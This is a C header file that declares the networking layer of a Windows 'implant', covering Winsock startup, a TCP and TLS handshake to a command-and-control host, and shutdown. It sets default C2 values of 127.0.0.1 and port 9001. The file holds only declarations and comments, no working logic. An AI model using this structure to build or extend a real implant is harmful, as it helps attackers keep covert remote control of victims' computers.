#pragma once

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

/* WinSock2.h before Windows.h — mandatory ordering. */
#include <WinSock2.h>
#include <WS2tcpip.h>
#include <Windows.h>

#include "debug.h"
#include "tls.h"

/*
 * network.h - TCP connection establishment for the implant polling loop.
 *
 * NetworkInit now performs the full TCP + TLS handshake, writing the result
 * into a TLS_CONTEXT.  Cleanup (TLS shutdown + socket close) is handled by
 * TlsCleanup in tls.h; NetworkCleanup is no longer needed.
 */

#define DEFAULT_C2_HOST L"127.0.0.1"
#define DEFAULT_C2_PORT L"9001"

 /**
  * @brief Initializes the Winsock runtime for the implant.
  *
  * Must be called once before any NetworkInit call.
  *
  * @return TRUE on success, FALSE if Winsock initialization fails.
  */
BOOL NetworkStartup(VOID);

/**
 * @brief Opens a TCP connection and performs the TLS handshake.
 *
 * On success, @p ctx holds an active TLS session ready for
 * HttpSendTlvRoundTrip.  On failure, no cleanup is required by the caller
 * (partial resources are released internally).
 *
 * @param host Wide-character C2 hostname or IP address.
 * @param port Wide-character port number string.
 * @param ctx  Output TLS context; must be zero-initialized by the caller.
 *
 * @return TRUE on success, FALSE if TCP connect or TLS handshake fails.
 */
BOOL NetworkInit(PCWSTR host, PCWSTR port, TLS_CONTEXT* ctx);

/**
 * @brief Shuts down the Winsock runtime.
 *
 * Call once during implant shutdown after all polling has stopped.
 */
VOID NetworkShutdown(VOID);